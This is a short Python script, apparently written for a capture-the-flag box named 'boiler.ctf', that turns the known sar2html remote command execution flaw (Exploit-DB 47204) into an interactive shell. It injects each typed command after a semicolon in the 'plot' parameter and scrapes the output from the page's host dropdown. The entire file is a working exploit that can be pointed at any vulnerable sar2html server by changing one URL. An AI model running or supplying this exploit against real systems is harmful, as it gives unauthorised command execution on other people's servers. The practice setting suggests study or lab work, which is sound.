"""
Simple shell for sar2html remote command execution vulnerability.

See <https://www.exploit-db.com/exploits/47204> for more information.
"""

import urllib.parse as url_encode

import requests
from bs4 import BeautifulSoup

BASE_URL = "http://boiler.ctf/joomla/_test/index.php"

def sar2html_shell(url, encoded_command):

    args = "?plot=;"
    response = requests.get(f"{url}{args}{encoded_command}")

    soup = BeautifulSoup(response.text, "html.parser")

    host = soup.find("select", {"name": "host"})
    options = host.find_all("option")
    command_output = [out.string for out in options]

    filter_strings = ['Select Host', 'HPUX', 'Linux', 'SunOS']

    return list(filter(lambda s: s not in filter_strings, command_output))


if __name__ == "__main__":
    print(f"Connecting to URL {BASE_URL}")

    while True:
        command = input("> ")

        command_encoded = url_encode.quote_plus(command)

        output = sar2html_shell(BASE_URL, command_encoded)

        print("Output:")

        for out in output:
            print(f"- {out}")

